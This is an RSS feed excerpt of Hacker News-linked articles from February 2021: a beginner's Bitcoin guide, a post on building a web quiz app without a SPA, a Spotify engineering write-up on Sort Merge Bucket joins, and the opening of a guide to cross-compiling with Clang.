<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="https://serhack.me/images/bitcoin-getting-started/social_oasis.jpg"><figcaption><h4>A man looks for Bitcoin Oasis</h4></figcaption></figure><p>If you have heard about blockchain or cryptocurrency, then the term that initially comes to mind is <a href="https://bitcoin.org/">Bitcoin</a>. Launched 12 years ago, it was the late 2017 bull run that created a media frenzy that propelled Bitcoin into the mainstream and our modern day lexicon.</p><p>Often labeled as the “original” cryptocurrency, <a href="https://bitcoin.org/">Bitcoin</a> has been the catalyst (directly and/or indirectly) behind many new innovations in the blockchain and digital asset space, most notably <a href="https://ethereum.org/">Ethereum</a> and <a href="https://getmonero.org/">Monero</a>. Shortly after the late 2017 bull run lost its steam, interest in these new technologies started to fade ― but here we are in 2021 with Bitcoin having risen like a phoenix from the ashes. As you would assume, an appetite for the blockchain and digital asset space has returned and now it is more important than ever that we understand what exactly is behind this unique asset, Bitcoin.</p><p>This article is meant to be a guide for individuals who are new to cryptocurrency and want to learn about <a href="https://bitcoin.org/">Bitcoin</a>, specifically its use case and the different ways to become involved in the broader blockchain and digital asset space. My goal is to educate you on the basics and make sure that you walk away with a newfound perspective and understanding of <a href="https://bitcoin.org/">Bitcoin</a>.</p><h2 id="what-is-bitcoin">What is Bitcoin?</h2><p>Bitcoin is a peer-to-peer version of electronic cash whose transactions are recorded in a public distributed ledger called a blockchain. In late October 2008, Satoshi Nakamoto (whose identity is still unknown) published a white paper titled <a href="https://bitcoin.org/bitcoin.pdf"><em>Bitcoin: A Peer-to-Peer Electronic Cash System</em></a> on bitcoin.org (registered in August 2008) and subsequently posted it to <a href="https://www.metzdowd.com/pipermail/cryptography/2008-October/014810.html">a cryptography mailing list</a>. On January 3, 2009, the Bitcoin network was created when Satoshi Nakamoto mined the initial block of the chain, which is called the genesis block.</p><p>In essence, Bitcoin is a decentralized type of “digital money” that can be used by anyone around the world, at any time, and without restrictions or a central authority. Bitcoin is not backed by any bank or government and originally allowed users to freely send and/or spend it anywhere without trusting third parties.</p><p>At inception, the price of Bitcoin was approximately $0.01 and, as of today, the price has surpassed $40,000 per coin ― with many believing that it can grow exponentially higher to levels between $100,000 and $250,000 in the next year or so.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_1_blockchain-80.jpg"><figcaption><h4>The transactions data are memorized through a chain-of-blocks</h4></figcaption></figure><p>Given that Bitcoin exists and operates within the confounds of the Internet, all user balances are kept on an immutable and fully transparent blockchain. Put simply, each Bitcoin transaction is broadcasted to the Bitcoin network and grouped with several other transactions in the form of a block, which the network’s miners validate. Once the block is accepted, the transactions get recorded on the blockchain (which, as you may recall, is a public ledger). Whenever this process is successfully completed, the network distributes new Bitcoin to miners for each block that has been validated ― this is referred to as a block reward.</p><p>The peculiarity of the blockchain is its distribution and decentralized properties, as all the nodes share a valid copy of the public ledger. In the Bitcoin network, nodes play a very important role ― think of them as “protectors” who are constantly monitoring Bitcoin’s blockchain to distinguish legitimate Bitcoin transactions from illegitimate ones. The basic job of a node is to prevent attempts to double-spend Bitcoins that have already been spent elsewhere. In addition, the process of mining is essential to validating transactions, as it ensures the overall trustworthiness and security of the payment network.</p><h2 id="advantages-and-limitations">Advantages and Limitations</h2><p>Members of the cryptocurrency community, who range from the tech savvy to your average retail investor, have adopted various perspectives regarding the fundamental driver of Bitcoin’s value (both in financial and non-financial terms).</p><p>On one side, there are the Bitcoin Maximalists who believe that Bitcoin is the ultimate financial innovation and will assume a mainstream role in global society ― to maximalists, other cryptocurrencies and traditional financial instruments are inferior. On the other side, you have cryptocurrency enthusiasts who believe Bitcoin’s technology is outdated and that other cryptocurrencies, such as Ethereum, have more expansive utility.</p><p>These arguments and differences of opinion (as it relates to Bitcoin) can often become confusing, so let’s dig deeper into some of the most common discussion points with hopes that you can decipher for yourself.</p><h3 id="advantages">Advantages</h3><ul><li>A blockchain is managed autonomously using <strong>a peer-to-peer network</strong> and cannot be shut down ― the only way to stop it is through shutting down or banning Internet access. (Note: Even though a blockchain or Bitcoin cannot be shut down, some jurisdictions have imposed restrictions on citizens that limit or ban the holding or trading of Bitcoin and/or other cryptocurrencies.)</li><li>There is no need to trust a third party. <strong>You are your own bank!</strong></li><li>Relatively quick and cheap transactions without intermediary fees (around 10 minutes on average per transaction), when compared to most leading cryptocurrencies.</li><li>Increasing adoption by merchants and individuals across the globe.</li><li>Largest market capitalization and name recognition, which will continue to promote its growth and (hopefully) price stability.</li></ul><h3 id="limitations">Limitations</h3><ul><li><strong>Lack of anonymity</strong> as transactions that take place in the Bitcoin network, along with many other leading cryptocurrencies, are fully transparent and can potentially be linked via chain analysis. In addition, strict AML/KYC regulations require many of the leading cryptocurrency trading exchanges to verify your most sensitive personal information.</li><li>Slow and expensive transactions, when compared to lesser known cryptocurrencies that can be sent within seconds and at a fraction of the cost.</li><li>Irreversible transactions. Once a transaction is sent, you cannot undo or cancel the transaction.</li><li>Achievement of its status as a currency will be challenging due to its volatile nature (i.e. swings in price) and regulations.</li><li>The core technology has some subtle limits that make Bitcoin outdated in comparison with other cryptocurrencies.</li></ul><p>Along with Bitcoin Maximalists and cryptocurrency enthusiasts, you have many individuals who simply like to be long-term holders of Bitcoin (because they believe in the fundamentals and value proposition) and others who speculate on the short-term price (e.g. day traders).</p><p>Whatever side you are on, there is no question that Bitcoin has established itself as a serious contender in the financial world and is here to stay for the time being. There may be other alternatives, but the granddaddy of cryptocurrencies still has the spotlight!</p><h2 id="how-to-obtain-bitcoin-from-an-exchange">How to Obtain Bitcoin from an Exchange</h2><p>Now that you have an understanding of Bitcoin and its utility, you may be interested in purchasing some. If that is the case, you have come to the right place as buying it is now easier than ever due to the growing number of exchanges and companies making Bitcoin accessible to the masses.</p><p>Some of the most well-known exchanges that allow you to purchase Bitcoin and other cryptocurrencies are <a href="https://coinbase.com/">Coinbase</a>, <a href="https://www.gemini.com/">Gemini</a>, <a href="https://www.kraken.com/">Kraken</a>, <a href="https://binance.com/">Binance</a>, and <a href="https://www.huobi.com/en-us/">Huobi</a>. While all of these exchanges list Bitcoin, not all of them offer the same cryptocurrencies ― so, it is recommended to open accounts across a few exchanges to ensure that you are provided adequate exposure.</p><p>Once you have created an account on an exchange, you can transfer your local fiat money via ACH or bank wire to the exchange. From there, you can purchase Bitcoin or another cryptocurrency in exchange for your local fiat money. In addition, after purchasing Bitcoin, you can exchange it for another cryptocurrency that you might not be able to purchase with your local fiat money. While some exchanges offer credit card purchases of Bitcoin, please keep in mind that the fees associated with this transaction are typically very high.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_2_exchange-80.jpg"><figcaption><h4>You can exchange central currencies (EUR, USD) to BTC, but sacrificing privacy.</h4></figcaption></figure><p>Using any of the exchanges listed above is the easiest and most convenient way to purchase Bitcoin, as the majority of the other cryptocurrency exchanges do not support fiat currencies. This being the case, you can only exchange other cryptocurrencies (like Ethereum or Monero) for Bitcoin. <a href="https://cash.app/">Cash App</a> and <a href="https://www.paypal.com/us/webapps/mpp/crypto">PayPal</a>, some of the largest financial technology companies, offer its users the ability to purchase Bitcoin. While this is extremely convenient for users of these platforms, the downside for PayPal (not Cash App) is that your Bitcoin must remain on its platform, so you cannot transfer or send it. Remember: Not your keys, not your coins.</p><p>If you are not keen on using any of the methods described above, Bitcoin ATMs are a great alternative. There are over 14,000 physical ATMs worldwide, most of which can be found in major cities at peculiar locations such as a shopping mall, burger restaurant, or a bar. All you need to do is deposit cash and enter your Bitcoin address. Once you have completed the transaction, the funds will be sent to you. This is a very simple process and typically does not require any identity verification, but beware of high fees!</p><h2 id="who-accepts-bitcoin">Who Accepts Bitcoin?</h2><p>Over the years, many individuals and businesses have begun accepting Bitcoin as a form of payment. From time to time, you might have noticed stickers on a shop’s window that says “Bitcoin accepted here.” As mentioned above, after the bull run of late 2017 died down, overall interest in cryptocurrencies (especially Bitcoin) amongst merchants began to wane. Today, Bitcoin and the broader digital asset space has bounced back from a pricing perspective and, with this, so has the interest amongst merchants who have triggered another wave of increased acceptance, most notably <a href="https://apnews.com/article/financial-markets-elon-musk-bitcoin-061817c6795e75d1c3c9e9d6cfc4a911">Tesla</a> disclosing that it has invested approximately $1.5 billion into Bitcoin and that the company plans to accept Bitcoin as payment for its electric vehicles.</p><p>There have been a few prominent …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://serhack.me/articles/getting-started-with-bitcoin/">https://serhack.me/articles/getting-started-with-bitcoin/</a></em></p>]]>
            </description>
            <link>https://serhack.me/articles/getting-started-with-bitcoin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26112188</guid>
            <pubDate>Fri, 12 Feb 2021 10:29:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building web apps without a SPA – A case study]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26112011">thread link</a>) | @RupertWiser
<br/>
February 12, 2021 | http://benwiser.com/blog/Building-web-apps-without-a-SPA---A-case-study.html | <a href="https://web.archive.org/web/*/http://benwiser.com/blog/Building-web-apps-without-a-SPA---A-case-study.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p id="h.l7qn47u1544x"><span>Building web apps without a SPA - A case study</span></p><p><span>We all know that feeling. You’re scrolling through a page that’s full of mostly static content - constantly being interrupted by spinners - and the thought hits you, “Why did they use Javascript for this?”</span></p><p><span>Now this might not always be fair. I’ve done a fair amount of web development and there is definitely a time and a place for a SPA. And rendering libraries like React make client side work an absolute pleasure. But that’s not what I’m going to write about today. I’m going to write about all the </span><span>other</span><span>&nbsp;cases. Or as I like to call it, 73.6% of the internet.</span></p><p><span>My fiance is studying to become a veterinary physiotherapist. She has to learn </span><span>a lot</span><span>&nbsp;of animal body parts. She’s picked up a few books along the way to help her memorise various animal parts that normally look something like this:</span></p><p><span><img alt="" src="https://lh6.googleusercontent.com/kALs0Nu-AjBdB7ujRxyewUokHCMcT-idZaQ0aqQrhVJUP8x3c1g4Hf3E_3A_DZWW-TOdcig3Y_gl3Z8zzE0uqPyEh0I2fI6Gw1nX_VGNnOMX1ekeUI8nrdKaxeet8SYKkLqsLbeg" title=""></span></p><p><span>Ladies and Gentlemen, the canine</span></p><p><span>I took a look at the content she was studying and thought it would probably be handy if we could put all those pictures into a little quiz app so that she could test herself. After a bit of requirements gathering, it was decided it needed to support:</span></p><ul><li><span>Profiles</span></li><li><span>A group management system to share profiles with others</span></li><li><span>Referencing and tags</span></li><li><span>Some way for her to upload pictures and map body parts</span></li><li><span>Quizzes (of course!)</span></li></ul><p><span>To keep it simple, we added two types of quizzes. The first kind points to a body part and asks you to choose what limb it is. The second kind of quiz names a part and asks you to select it on the picture. All you need to do is first prepare quizzes by uploading images and selecting the limbs.</span></p><p><span>This is what is ends up looking like:</span></p><p><span><img alt="" src="https://lh3.googleusercontent.com/lLiY8kQz2JfDyeySZgzE6cC24HcQ_0MAw5a8ePJA1y94d5j-gDvv2e5aKOuYW7g0sKqW2qTfxKydlL1n_qCydremS_9GUpD-B9ymUfsXhwqxnjCbDkJD1TOiof5vU2vnxiZuKC_d" title=""></span></p><p><span>And here is what a quiz looks like:</span></p><p><span><img alt="" src="https://lh6.googleusercontent.com/nlY63N83LNXIJmA9fp530SXydjZIO16NLY1HUP9MVw-nQHQIYbU0RoglAf-QOSYgd3Yzwxz1WjnTCuFNxeAaFbgJxHFafhFQYQwB029O_ht-BbyN8kFKyEn-aYPOlIglV4lTKroJ" title=""></span></p><p><span>Nothing about this is particularly complex. I probably took around a day or so in total to add everything we wanted. I worked fast and loose and skipped automated tests because I don’t plan to work on it further (and most of it is CRUD operations).</span></p><p><span>What I would like to emphasize at this point is that I’ve seen many projects with a similar scope become a React/Angular/Bitcoin app. There are a few reasons I can think of (off the top of my head) for this:</span></p><ol start="1"><li><span>The developer would like to learn a new stack (nothing wrong with this!)</span></li><li><span>The developer uses it out of muscle memory</span></li><li><span>The developer wants to create an app like experience and things this will result in faster performance</span></li></ol><p><span>I have no issue with the first reason. I also don’t have an issue with the second reason when you just want to get something done fast and you’re comfortable with a way of working. What I would like to question however is the third reason.</span></p><p><span>When working on a smaller project, I often find that it is both simpler to reason with, and faster to write everything in the backend. And I don’t just mean faster in terms of development. I think you can make a much faster system overall when you’re not sending a bulky javascript bundle that needs to perform client side rendering.</span></p><p><span>As it turns out, a lot of people think server side rendering is slow simply because of the downloading and parsing browsers need to do with javascript. But there’s a handy little library I absolutely love that alleviates this problem entirely. </span><span><a href="https://github.com/turbolinks/turbolinks">Turbolinks</a></span><span>&nbsp;(made by the good folks at </span><span><a href="https://basecamp.com/">basecamp</a></span><span>) intercepts the links on your page and replaces them with ajax requests. It then takes care of placing the content back in your page. What this means is that you can entirely work </span><span>as if</span><span>&nbsp;your app is entirely server side, while still leaving it feeling very much like a web app. And the best part is we get to leave the browser to do the rendering work instead of a javascript engine! Browsers are actually pretty good at doing that.</span></p><p><span>Here’s what it ends up looking like in action:</span></p><p><span><img alt="" src="https://lh4.googleusercontent.com/-blx8YYUJdB1_aOeLIz7VAlPxsVolWFfNOA9uMvo1r41gUFUG-lv-u3wrqx6tRq5BOCRy5oJF4kDsNBh5UjH8hCsC6Bowlcl3umzLrAWlJHJUTyPQRB16VA-EdLMp0Xao_vAVFa4" title=""></span></p><p><span>Disclaimer:</span><span>&nbsp;I haven’t given it a go yet because it’s still in beta but the basecamp team has moved onto </span><span><a href="https://github.com/hotwired/turbo">Turbo</a></span><span>&nbsp;which is supposed to replace Turbolinks.</span></p><p><span>Then just to be extra safe, for the small parts of javascript I do use (for the quiz questions) I use </span><span><a href="https://rollupjs.org/guide/en/">rollup</a></span><span>&nbsp;to bundle it together. This ends up producing a very nice and small javascript bundle because I refused to use any javascript dependencies for the client side code. The bundle clocks in around 3.9kB.</span></p><p><span>What this results in is a very light weight, and easy to develop web app. Obviously there’s not a silver bullet that solves all problems but the next time you’re building a web app, it might be worth taking a step back and asking the question, “Do I really need a javascript frontend framework for this?”</span></p><p><span>As always you can find the code here if you want to take a deeper look:</span></p><p><span><a href="https://gitlab.com/BenWiser/physio-quiz">https://gitlab.com/BenWiser/physio-quiz</a></span></p></div></div>]]>
            </description>
            <link>http://benwiser.com/blog/Building-web-apps-without-a-SPA---A-case-study.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26112011</guid>
            <pubDate>Fri, 12 Feb 2021 09:47:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spotify Optimized the Largest Dataflow Job Ever for Wrapped 2020]]>
            </title>
            <description>
<![CDATA[
Score 195 | Comments 125 (<a href="https://news.ycombinator.com/item?id=26111993">thread link</a>) | @SirOibaf
<br/>
February 12, 2021 | https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020 | <a href="https://web.archive.org/web/*/https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <!-- post title -->
        

        <div>
            <p><img src="https://engineering.atspotify.com/wp-content/themes/theme-spotify/images/icon.png" alt=""></p><p><span>February 11, 2021</span>
                
            </p>
        </div>
        <!-- post details -->
        <p><a href="https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020/" title="How Spotify Optimized the Largest Dataflow Job Ever for Wrapped 2020">
                        <img src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image1.gif" alt="" loading="lazy" data-image-size="post-thumbnail" data-stateless-media-bucket="rnd-atspotify" data-stateless-media-name="sites/2/2021/02/image1.gif">                    </a></p>

        <!-- /post title -->

        
<p>In this post we’ll discuss how Spotify optimized and sped up elements from our largest Dataflow job, <a rel="noreferrer noopener" href="https://engineering.atspotify.com/2020/02/18/spotify-unwrapped-how-we-brought-you-a-decade-of-data/" target="_blank">Wrapped 2019</a>, for <a href="https://open.spotify.com/genre/2020-page">Wrapped 2020</a> using a technique called Sort Merge Bucket (SMB) join. We’ll present the design and implementation of SMB and how we incorporated it into our data pipelines.</p>



<h2>Introduction</h2>



<p>Shuffle is the core building block for many big data transforms, such as a join, GroupByKey, or other reduce operations. Unfortunately, it’s also one of the most expensive steps in many pipelines. Sort Merge Bucket is an optimization that reduces shuffle by doing work up front on the producer side. The intuition is that for datasets commonly and frequently joined on a known key, e.g., user events with user metadata on a user ID, we can write them in bucket files with records bucketed and sorted by that key. By knowing which files contain a subset of keys and in what order, shuffle becomes a matter of merge-sorting values from matching bucket files, completely eliminating costly disk and network I/O of moving key–value pairs around. Andrea Nardelli carried out the original investigation on Sort Merge Buckets for his <a href="http://kth.diva-portal.org/smash/get/diva2:1334587/FULLTEXT01.pdf">2018 master’s thesis</a>, and we started looking into generalizing the idea as a <a rel="noreferrer noopener" href="https://spotify.github.io/scio/extras/Sort-Merge-Bucket.html" target="_blank">Scio module</a> afterwards.</p>



<h2>Design and Implementation</h2>



<p>The majority of the data pipelines at Spotify are written in <a rel="noreferrer noopener" href="https://github.com/spotify/scio" target="_blank">Scio</a>, a Scala API for <a href="https://beam.apache.org/">Apache Beam</a>, and run on the <a href="https://cloud.google.com/dataflow">Google Cloud Dataflow</a> service. We implemented SMB in Java to be closer to the native Beam SDK (and even wrote and collaborated on a <a href="https://docs.google.com/document/d/1AQlonN8t4YJrARcWzepyP7mWHTxHAd6WIECwk1s3LQQ/edit?usp=sharing">design document with the Beam community</a>), and provide Scala syntactic sugar in Scio like many other I/Os. The design is modularized into the main components listed below — we’ll start with the two top-level SMB <a href="https://beam.apache.org/documentation/programming-guide/#transforms" target="_blank" rel="noreferrer noopener">PTransforms</a> — the write and read operations SortedBucketSink and SortedBucketSource.</p>



<h3>SortedBucketSink</h3>



<p>This transform writes a <a rel="noreferrer noopener" href="https://beam.apache.org/documentation/programming-guide/#pcollections" target="_blank">PCollection</a>&lt;T&gt; (where T has a corresponding <a href="https://github.com/spotify/scio/blob/master/scio-smb/src/main/java/org/apache/beam/sdk/extensions/smb/FileOperations.java" target="_blank" rel="noreferrer noopener">FileOperations&lt;T&gt;</a> instance) in SMB format. It first extracts keys and assigns bucket IDs using logic provided by <a href="https://github.com/spotify/scio/blob/master/scio-smb/src/main/java/org/apache/beam/sdk/extensions/smb/BucketMetadata.java" target="_blank" rel="noreferrer noopener">BucketMetadata</a>, groups key–values by the ID, sorts all values, and then writes them into files corresponding to bucket IDs using the FileOperations instance.</p>



<p>In addition to the bucket files, a JSON file is also written to the output directory representing the information from BucketMetadata that’s necessary to read the source: the number of buckets, the hashing scheme, and the instructions to extract the key from each record (for example, for Avro records we can encode this instruction with the name of the GenericRecord field containing the key).</p>



<figure><img loading="lazy" width="700" height="255" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-700x255.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-700x255.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-250x91.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-768x280.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-120x44.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5.png 1180w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<h3>SortedBucketSource</h3>



<p>This transform reads from one or more sources written in SMB format with the same key and hashing scheme. It opens file handles for corresponding buckets from each source (using FileOperations&lt;T&gt; for that input type) and merges them while maintaining sorted order. Results are emitted as <a rel="noreferrer noopener" href="https://github.com/apache/beam/blob/master/sdks/java/core/src/main/java/org/apache/beam/sdk/transforms/join/CoGbkResult.java" target="_blank">CoGbkResult</a> objects per key group, the same class Beam uses for regular Cogroup operations, so the user can extract the results per source with the correct parameterized type.</p>



<figure><img loading="lazy" width="700" height="365" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-700x365.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-700x365.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-250x130.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-768x400.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-120x63.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7.png 1067w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<h3>FileOperations</h3>



<p>FileOperations abstracts away the reading and writing of individual bucket files. Since we need fine-grained control over the exact elements and their order in every file, we cannot leverage the existing Beam file I/Os, which operate on a PCollection level and abstract away the locality and order of elements. Instead, SMB file operations happen at a lower level of BoundedSource for input and ParDo for output. Currently Avro, BigQuery TableRow JSON, and TensorFlow TFRecord/Example records are supported. We plan to add other formats like Parquet as well.</p>



<h3>BucketMetadata</h3>



<p>This class abstracts the keying and bucketing of elements, and includes information such as key field, class, number of buckets, shards, and hash function. The metadata is serialized as a JSON file alongside data files when writing, and used to check compatibility when reading SMB sources.</p>



<h3>Optimizations and Variants</h3>



<p>Over the last year and a half we’ve been adopting SMB at Spotify for various use cases, and accumulated many improvements to handle the scale and complexity of our data pipelines.</p>



<ul><li><strong>Date partitioning:</strong> At Spotify, event data is written to Google Cloud Services (GCS) in hourly or daily partitions. A common data engineering use case is to read many partitions in a single pipeline — for example, to compute stream count over the last seven days. For a non-SMB read, this can be easily done in a single PTransform using wildcard file patterns to match files across multiple directories. However, unlike most File I/Os in Beam, the SMB Read API requires the input to be specified as a directory, rather than a file pattern (this is because we need to check the directory’s metadata.json file as well as the actual record files). Additionally, it must match up bucket files across partitions as well as across different sources, while ensuring that the CoGbkResult output correctly groups data from all partitions of a source into the same TupleTag key. We evolved the SMB Read API to accept one or more directories <em>per source</em>.&nbsp;</li></ul>



<ul><li><strong>Sharding:</strong> Although the Murmur class of hash functions we use during bucket assignment usually ensures an even distribution of records across buckets, in some instances one or more buckets may be disproportionately large if the key space is skewed, creating possible OOM errors when grouping and sorting records. In this case, we allow users to specify a number of <em>shards</em> to further split each bucket file. During the bucket assignment step, a value between [0, numShards) is generated randomly <a href="https://beam.apache.org/documentation/runtime/model/#bundling-and-persistence"><em>per bundle</em></a>. Since this value is computed completely orthogonally to the bucket ID, it can break up large key groups across files. Since each shard is still written in sorted order, they can simply be merged together at read time.</li></ul>



<ul><li><strong>Parallelism:</strong> Since the number of buckets in an SMB sink is always a power of 2, we can come up with a joining scheme across sources with different numbers of buckets based off of a desired level of parallelism specified by the user. For example, if the user wants to join Source 1 with 4 buckets and Source 2 with 2 buckets, they can specify either:<ul><li><strong>Minimum parallelism,</strong> or “Merge Greatest Buckets” strategy: 2 parallel readers will be created. Each reader will read 2 buckets from source A and 1 from source B, merging them together. Because bucket IDs are assigned by taking the integer hash value of the key modulo the desired number of buckets, mathematically we know that the key spaces of the merged buckets overlap.</li><li><strong>Maximum parallelism,</strong> or “Least Bucket Replication” strategy: 4 parallel readers will be created. Each reader will read 1 bucket from Source A and 1 from Source B. After merging each key group, the reader will have to rehash the key modulo the greatest number of buckets, to avoid emitting duplicate values. Therefore, even though this strategy achieves a higher level of parallelism, there is some overhead of computing duplicate values and rehashing to eliminate them.</li><li><strong>Auto parallelism:</strong> Creates a number of readers between minimal and maximal amounts, based on a desired split size value provided by the Runner at runtime.</li></ul></li></ul>



<figure><img loading="lazy" width="700" height="459" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-700x459.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-700x459.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-250x164.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-768x504.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-120x79.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3.png 1115w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<ul><li><strong>SortedBucketTransform:</strong> A common usage pattern is for pipelines to enrich an existing dataset by joining it with one or more other sources, then writing it to an output location. We decided to specifically support this in SMB with a unique PTransform that reads, transforms, and writes output using the same keying and bucketing scheme. By doing the read/transform/write logic per bucket on the same worker, we can avoid having to reshuffle the data and recompute buckets — since the key is the same, we know that the transformed elements from bucket M of the inputs also correspond to bucket M in the output, in the same sorted order as they were read from.</li></ul>



<figure><img loading="lazy" width="700" height="320" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-700x320.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-700x320.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-250x114.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-768x351.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-120x55.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4.png 902w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<ul><li><strong>External Sort:</strong> We made a number of improvements to Beam’s <a href="https://github.com/apache/beam/tree/master/sdks/java/extensions/sorter">external sorter extension</a>, including replacing the Hadoop sequence file with the native file I/O, removing the 2GB memory limit, and reducing disk usage and coder overhead.</li></ul>



<h2>Adoption — Core Data Producers</h2>



<p>Since SMB requires data to be bucketed and sorted in a specific fashion, the adoption naturally starts from the producer of that data. A majority of the Spotify data processing relies on a few core data sets that act as single sources of truth for various business domains like streaming activities, user metadata and streaming context. We worked with the maintainer of these data sets to convert a year’s worth of data to SMB format.</p>



<p>Implementation was straightforward since SortedBucketSink is mostly a drop-in replacement for the vanilla Avro sink with some extra settings. We were using Avro sink with the sharding option to control the number and size of output files. After migrating to SMB, we did not notice any major bump in terms of vCPU, vRAM, or wall time since sharding requires a full shuffle similar to the additional cost of SMB sinks. A few other settings we have since had to tweak:</p>



<ul><li>Agree on user_id as a hexadecimal string as bucket and sort key, since we need the same key type and semantic across all SMB datasets.</li><li>Set compression to DEFLATE with level 6 to be consistent with the default Avro sink in Scio. As a nice side effect of data being bucketed and sorted by key, we observed ~50% reduction in storage from better compression due to collocation of similar records.</li><li>Make sure output files are backwards compatible. SMB output files have “bucket-X-shard-Y” in their names but otherwise contain the same records with the same schema. So existing pipelines can consume them without any code change; they just do not leverage the speedup in certain join cases.</li></ul>



<h2>Adoption — Wrapped 2020</h2>



<p>Once the core datasets were available in SMB format, we …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020">https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020</a></em></p>]]>
            </description>
            <link>https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111993</guid>
            <pubDate>Fri, 12 Feb 2021 09:44:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to use Clang to cross compile for everything]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26111761">thread link</a>) | @mcilloni
<br/>
February 12, 2021 | https://mcilloni.ovh/2021/02/09/cxx-cross-clang/ | <a href="https://web.archive.org/web/*/https://mcilloni.ovh/2021/02/09/cxx-cross-clang/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>09 Feb 2021</span></p><p>Anyone who ever tried to cross-compile a C/C++ program knows how big a PITA the whole process could be. The main reasons for this sorry state of things are generally how byzantine build systems tend to be when configuring for cross-compilation, and how messy it is to set-up your cross toolchain in the first place.</p>

<p>One of the main culprits in my experience has been the GNU toolchain, the decades-old behemoth upon which the POSIXish world has been built for years.
Like many compilers of yore, GCC and its <code>binutils</code> brethren were never designed with the intent to support multiple targets within a single setup, with he only supported approach being installing a full cross build for each triple you wish to target on any given host.</p>

<p>For instance, assuming you wish to build something for FreeBSD on your Linux machine using GCC, you need:</p>

<ul>
  <li>A GCC + binutils install for your host triplet (i.e., <code>x86_64-pc-linux-gnu</code> or similar);</li>
  <li>A GCC + binutils complete install for your target triplet (i.e. <code>x86_64-unknown-freebsd12.2-gcc</code>, <code>as</code>, <code>nm</code>, etc)</li>
  <li>A sysroot containing the necessary libraries and headers, which you can either build yourself or promptly steal from a running installation of FreeBSD.</li>
</ul>

<p>This process is sometimes made simpler by Linux distributions or hardware vendors offering a selection of prepackaged compilers, but this will never suffice due to the sheer amount of possible host-target combinations. This sometimes means you have to build the whole toolchain yourself, something that, unless you rock a quite beefy CPU, tends to be a massive waste of time and power.</p>

<h2 id="clang-as-a-cross-compiler">Clang as a cross compiler</h2>

<p>This annoying limitation is one of the reasons why I got interested in LLVM (and thus Clang), which is by-design a full-fledged cross compiler toolchain and is mostly compatible with GNU. A single install can output and compile code <em>for every supported target</em>, as long as a complete sysroot is available at build time.</p>

<p>I found this to be a game-changer, and, while it can’t still compete in convenience with modern language toolchains (such as Go’s gc and <code>GOARCH</code>/<code>GOOS</code>), it’s night and day better than the rigmarole of setting up GNU toolchains. You can now just fetch whatever your favorite package management system has available in its repositories (as long as it’s not extremely old), and avoid messing around with multiple installs of GCC.</p>

